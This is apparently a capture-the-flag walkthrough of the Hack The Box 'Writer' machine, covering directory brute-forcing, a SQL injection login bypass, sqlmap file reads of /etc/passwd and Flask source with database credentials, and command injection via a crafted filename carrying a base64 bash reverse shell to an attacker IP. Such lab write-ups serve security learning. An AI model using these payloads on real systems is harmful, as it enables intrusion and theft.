# # `Enumeration` -

![[Pasted image 20220101072726.png]]

Upon exploring the website we didn't found anything inteesting.

# # `Gobuster` -

Using gobuster to find directories -

```bash
root@napster:~/Documents/HTB/Writer# gobuster dir -u http://10.10.11.101/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -o gobuster.txt -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.11.101/
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2022/01/01 07:32:27 Starting gobuster
===============================================================
/contact (Status: 200)
/about (Status: 200)
/static (Status: 301)
/logout (Status: 302)
/dashboard (Status: 302)
/administrative (Status: 200)
```

we found an interseting directory `/administrative`


- #### Visiting `http://10.10.11.101/administrative` -

![[Pasted image 20220101073603.png]]

# # `SQL Injection` -

Since we were presented with a login page its always worth to try for Sql Injection -

Payload - ``admin' or 1=1 limit 1;-- -``

![[Pasted image 20220101074247.png]]

And we were able to bypass the login successfully -

![[Pasted image 20220101074745.png]]

Since we found out that its vulnerable to sql injection lets try `SqlMap`.Capture the login request and throw it into sqlmap -

```bash
POST /administrative HTTP/1.1
Host: 10.10.11.101
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.101/administrative
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Connection: close
Cookie: session=eyJ1c2VyIjoiYWRtaW4nIG9yIDE9MSBsaW1pdCAxOy0tIC0ifQ.YdBNAg.x11WH3iyUKNRXT6wxbzNyiEFXQA
Upgrade-Insecure-Requests: 1

uname=admin&password=admin
```

Save it as login.req

```bash
root@napster:~/Documents/HTB/Writer# sqlmap -r login.req 
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.3.11#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:24:27 /2022-01-01/

[08:24:27] [INFO] parsing HTTP request from 'login.req'
[08:24:29] [INFO] testing connection to the target URL
sqlmap got a 302 redirect to 'http://10.10.11.101/dashboard'. Do you want to follow? [Y/n] n
<snip>
sqlmap identified the following injection point(s) with a total of 75 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 4039 FROM (SELECT(SLEEP(5)))JJkQ) AND 'uokL'='uokL&password=password

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: uname=admin' UNION ALL SELECT NULL,CONCAT(0x717a787171,0x65676341786e6f636f4c4c51704a6c756869516a42556a4763664b49415558694374686c6e6a5569,0x7178707a71),NULL,NULL,NULL,NULL-- diRx&password=password
---
[08:33:56] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
<snip>
```

- #### Database Info -

```bash
root@napster:~/Documents/HTB/Writer# sqlmap -r login.req --dbs
<snip>
available databases [2]:
[*] information_schema
[*] writer
<snip>
```

- #### Dump -

```bash
root@napster:~/Documents/HTB/Writer# sqlmap -r login.req -D writer -T users --dump
Database: writer
Table: users
[1 entry]
+----+------------------+--------+----------+----------------------------------+--------------+
| id | email            | status | username | password                         | date_created |
+----+------------------+--------+----------+----------------------------------+--------------+
| 1  | admin@writer.htb | Active | admin    | 118e48794631a9612484ca8b55f622d0 | NULL         |
+----+------------------+--------+----------+----------------------------------+--------------+
```

The hash was not crackable.

The `--privileges` flag in `sqlmap` will show that the current user can read files:

```bash
root@napster:~/Documents/HTB/Writer# sqlmap -r login.req --privileges
database management system users privileges:
[*] 'admin'@'localhost' [1]:
    privilege: FILE
```

```bash
root@napster:~/Documents/HTB/Writer# sqlmap -r login.req --file-read=/etc/passwd
```

```bash
root@napster:~/Documents/HTB/Writer# cat /root/.sqlmap/output/10.10.11.101/files/_etc_passwd                                            
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
postfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin
filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh
john:x:1001:1001:,,,:/home/john:/bin/bash
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
```

Grabbing user with shell access -

```bash
root@napster:~/Documents/HTB/Writer# cat /root/.sqlmap/output/10.10.11.101/files/_etc_passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash
filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh
john:x:1001:1001:,,,:/home/john:/bin/bash
```

We got two users `Kyle` & `John`

Since we can read files lets try to read the web config file -

```bash
root@napster:~/Documents/HTB/Writer# sqlmap -r login.req --file-read=/etc/apache2/sites-enabled/000-default.conf
```

```bash
# Virtual host configuration for writer.htb domain
<VirtualHost *:80>
        ServerName writer.htb
        ServerAdmin admin@writer.htb
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
        <Directory /var/www/writer.htb>
                Order allow,deny
                Allow from all
        </Directory>
        Alias /static /var/www/writer.htb/writer/static
        <Directory /var/www/writer.htb/writer/static/>
                Order allow,deny
                Allow from all
        </Directory>
        ErrorLog ${APACHE_LOG_DIR}/error.log
        LogLevel warn
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

# Virtual host configuration for dev.writer.htb subdomain
# Will enable configuration after completing backend development
# Listen 8080
#<VirtualHost 127.0.0.1:8080>
#	ServerName dev.writer.htb
#	ServerAdmin admin@writer.htb
#
        # Collect static for the writer2_project/writer_web/templates
#	Alias /static /var/www/writer2_project/static
#	<Directory /var/www/writer2_project/static>
#		Require all granted
#	</Directory>
#
#	<Directory /var/www/writer2_project/writerv2>
#		<Files wsgi.py>
#			Require all granted
#		</Files>
#	</Directory>
#
#	WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env
#	WSGIProcessGroup writer2_project
#	WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py
#        ErrorLog ${APACHE_LOG_DIR}/error.log
#        LogLevel warn
#        CustomLog ${APACHE_LOG_DIR}/access.log combined
#
#</VirtualHost>
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

The main web app is hosted from `/var/www/writer.htb`, and the file `writer.wsgi` is specifically called out.

- ####  Lets check out `writer.wsgi` -

WSGI is an interface for how Python applications can be hosted by something like Apache or NGINX

```bash
root@napster:~/Documents/HTB/Writer# sqlmap -r login.req --file-read=/var/www/writer.htb/writer.wsgi
```

```bash
#!/usr/bin/python
import sys
import logging
import random
import os

# Define logging
logging.basicConfig(stream=sys.stderr)
sys.path.insert(0,"/var/www/writer.htb/")

# Import the __init__.py from the app folder
from writer import app as application
application.secret_key = os.environ.get("SECRET_KEY", "")
```

Its importing an app object from `writer/__init__.py`. 
`__init__.py` is kind of like index.html for webpages. It’s the default file for a module.
`__init__.py` in this case is the main Flask application.

```bash
root@napster:~/Documents/HTB/Writer# sqlmap -r a.req --file-read=/var/www/writer.htb/writer/__init__.py
```

```bash
from flask import Flask, session, redirect, url_for, request, render_template
from mysql.connector import errorcode
import mysql.connector
import urllib.request
import os
import PIL
from PIL import Image, UnidentifiedImageError
import hashlib

app = Flask(__name__,static_url_path='',static_folder='static',template_folder='templates')

#Define connection for database
def connections():
    try:
        connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')
        return connector
    except mysql.connector.Error as err:
        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
            return ("Something is wrong with your db user name or password!")
        elif err.errno == errorcode.ER_BAD_DB_ERROR:
            return ("Database does not exist")
        else:
            return ("Another exception, returning!")
    else:
        print ('Connection to DB is ready!')

#Define homepage
@app.route('/')
def home_page():
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('blog/blog.html', results=results)

#Define about page
@app.route('/about')
def about():
    return render_template('blog/about.html')

#Define contact page
@app.route('/contact')
def contact():
    return render_template('blog/contact.html')

#Define blog posts
@app.route('/blog/post/<id>', methods=['GET'])
def blog_post(id):
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    cursor.execute("SELECT * FROM stories WHERE id = %(id)s;", {'id': id})
    results = cursor.fetchall()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    stories = cursor.fetchall()
    return render_template('blog/blog-single.html', results=results, stories=stories)

#Define dashboard for authenticated users
@app.route('/dashboard')
def dashboard():
    if not ('user' in session):
        return redirect('/')
    return render_template('dashboard.html')

#Define stories page for dashboard and edit/delete pages
@app.route('/dashboard/stories')
def stories():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    sql_command = "Select * From stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('stories.html', results=results)

@app.route('/dashboard/stories/add', methods=['GET', 'POST'])
def add_story():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        if request.files['image']:
            image = request.files['image']
            if ".jpg" in image.filename:
                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
                image.save(path)
                image = "/img/{}".format(image.filename)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('add.html', error=error)

        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image) 
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/','')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render_template('add.html', error=error)
                except:
                    error = "Issue uploading picture"
                    return render_template('add.html', error=error)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('add.html', error=error)
        author = request.form.get('author')
        title = request.form.get('title')
        tagline = request.form.get('tagline')
        content = request.form.get('content')
        cursor = connector.cursor()
        cursor.execute("INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,'Published',now(),%(image)s);", {'author':author,'title': title,'tagline': tagline,'content': content, 'image':image })
        result = connector.commit()
        return redirect('/dashboard/stories')
    else:
        return render_template('add.html')

@app.route('/dashboard/stories/edit/<id>', methods=['GET', 'POST'])
def edit_story(id):
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        if request.files['image']:
            image = request.files['image']
            if ".jpg" in image.filename:
                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
                image.save(path)
                image = "/img/{}".format(image.filename)
                cursor = connector.cursor()
                cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
                result = connector.commit()
            else:
                error = "File extensions must be in .jpg!"
                return render_template('edit.html', error=error, results=results, id=id)
        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image) 
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/','')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                        cursor = connector.cursor()
                        cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
                        result = connector.commit()

                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render_template('edit.html', error=error, results=results, id=id)
                except:
                    error = "Issue uploading picture"
                    return render_template('edit.html', error=error, results=results, id=id)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('edit.html', error=error, results=results, id=id)
        title = request.form.get('title')
        tagline = request.form.get('tagline')
        content = request.form.get('content')
        cursor = connector.cursor()
        cursor.execute("UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s", {'title':title, 'tagline':tagline, 'content':content, 'id': id})
        result = connector.commit()
        return redirect('/dashboard/stories')

    else:
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        return render_template('edit.html', results=results, id=id)

@app.route('/dashboard/stories/delete/<id>', methods=['GET', 'POST'])
def delete_story(id):
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        cursor = connector.cursor()
        cursor.execute("DELETE FROM stories WHERE id = %(id)s;", {'id': id})
        result = connector.commit()
        return redirect('/dashboard/stories')
    else:
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        return render_template('delete.html', results=results, id=id)

#Define user page for dashboard
@app.route('/dashboard/users')
def users():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database Error"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM users;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('users.html', results=results)

#Define settings page
@app.route('/dashboard/settings', methods=['GET'])
def settings():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database Error!"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM site WHERE id = 1"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('settings.html', results=results)

#Define authentication mechanism
@app.route('/administrative', methods=['POST', 'GET'])
def login_page():
    if ('user' in session):
        return redirect('/dashboard')
    if request.method == "POST":
        username = request.form.get('uname')
        password = request.form.get('password')
        password = hashlib.md5(password.encode('utf-8')).hexdigest()
        try:
            connector = connections()
        except mysql.connector.Error as err:
            return ("Database error")
        try:
            cursor = connector.cursor()
            sql_command = "Select * From users Where username = '%s' And password = '%s'" % (username, password)
            cursor.execute(sql_command)
            results = cursor.fetchall()
            for result in results:
                print("Got result")
            if result and len(result) != 0:
                session['user'] = username
                return render_template('success.html', results=results)
            else:
                error = "Incorrect credentials supplied"
                return render_template('login.html', error=error)
        except:
            error = "Incorrect credentials supplied"
            return render_template('login.html', error=error)
    else:
        return render_template('login.html')

@app.route("/logout")
def logout():
    if not ('user' in session):
        return redirect('/')
    session.pop('user')
    return redirect('/')

if __name__ == '__main__':
   app.run("0.0.0.0")
```

We found some database creds -

```bash
connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1',
```

#### `Vulnerable code` -

```bash
if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
					try:
                        im = Image.open(image)
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/','')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                        cursor = connector.cursor()
                        cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
                        result = connector.commit()

```

The code is calling `os.sytem`
So if I can have it point to an existing file, and that filename has command injection in it, I should be able to get execution.

Shell -

```bash
root@napster:~/Documents/HTB/Writer# echo 'bash -c "bash -i >& /dev/tcp/10.10.14.41/9001 0>&1"' | base64
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40MS85MDAxIDA+JjEiCg==
root@napster:~/Documents/HTB/Writer# touch 'test.jpg; echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40MS85MDAxIDA+JjEiCg==|base64 -d|bash;'
```

```bash
root@napster:~/Documents/HTB/Writer# ls -la
total 28
drwxr-xr-x   4 root root 4096 Jan  1 09:30  .
drwxr-xr-x 118 root root 4096 Dec 31 07:26  ..
-rw-r--r--   1 root root  498 Jan  1 08:31  a.req
-rw-r--r--   1 root root  143 Jan  1 07:36  gobuster.txt
-rw-r--r--   1 root root  567 Jan  1 08:33  login.req
drwxr-xr-x   2 root root 4096 Jan  1 07:18  nmap
-rw-r--r--   1 root root    0 Jan  1 09:30 'test.jpg; echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40MS85MDAxIDA+JjEiCg==|base64 -d|bash;'
drwxr-xr-x   4 root root 4096 Jan  1 07:47  Writer
```

Go to the webpage and add a story -

![[Pasted image 20220101093621.png]]

Intercept the request with burp send it to repeater(for future use) and forward it-

Visiting the /static/img we can see our image -

![[Pasted image 20220101094255.png]]

We can see our story on the webpage now edit it -

![[Pasted image 20220101094443.png]]

Click on Edit and capture the request

Now set  the `image` filename to empty -
![[Pasted image 20220101095200.png]]

And set the `image_url` parameter to our reverse shell.

![[Pasted image 20220101095626.png]]

Start your listener-

```bash
root@napster:~/Documents/HTB/Writer# nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.11.101] 34516
bash: cannot set terminal process group (996): Inappropriate ioctl for device
bash: no job control in this shell
www-data@writer:/$ whoami
whoami
www-data
```

Stable Shell -

```bash
www-data@writer:/$ which python3
which python3
/usr/bin/python3
www-data@writer:/$ python3 -c 'import pty;pty.spawn("/bin/bash");'
python3 -c 'import pty;pty.spawn("/bin/bash");'
www-data@writer:/$ ^Z
[1]+  Stopped                 nc -nvlp 9001
root@napster:~/Documents/HTB/Writer# stty raw -echo
root@napster:~/Documents/HTB/Writer# nc -nvlp 9001

www-data@writer:/$ stty cols 158 rows 41                                     
www-data@writer:/$ 
```

